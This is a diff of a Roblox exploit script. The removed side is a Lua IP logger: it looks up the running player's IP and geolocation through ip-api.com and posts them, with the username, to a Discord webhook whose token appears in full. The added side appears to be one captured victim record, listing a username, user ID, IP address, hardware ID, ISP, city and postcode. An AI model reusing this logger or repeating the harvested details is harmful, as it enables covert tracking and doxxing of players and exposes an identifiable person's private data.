@@ -1,19 +1,29 @@
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1370591615831511060/z9evp47-li0ehbNuHTYIlQnDJfKP4xUK8whG6VGjF6I3PStYlRbA8vhvarS5wUabRQZE"
+__[Player Info](https://www.roblox.com/users/5021292248)__
+**Display Name:** AGB_Dk
+**Username:** BESTAKGOD36
+**User Id:** 5021292248
+**MembershipType:** None
+**AccountAge:** 819
+**Country:** en-us
+**IP:** 2.99.185.143
+**Hwid:** ee3595aa-8499-4d5b-b738-155330d04a87
+**Date:** 12/08/2025
+**Time:** 06:48:00
 
-local ip_info = syn.request({
-    Url = "http://ip-api.com/json",
-    Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-syn.request(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-)
+__[Game Info](https://www.roblox.com/games/123974602339071)__
+**Game:** [UP] Just a baseplate.
+**Game Id**: 123974602339071
+**Exploit:** Shitty Exploit
+
+**IP Information:**
+**isp:** TalkTalk Communications Limited
+**regionName:** Wales
+**city:** Swansea
+**query:** 2.99.185.143
+**as:** AS13285 TalkTalk Communications Limited
+**zip:** SA1
+**country:** United Kingdom
+**org:** Opal DSL Npe001 NEW
+
+**JobId:**
+```Roblox.GameLauncher.joinGameInstance(123974602339071, "5eedcef4-051c-444c-a115-92b46dbe0998")```
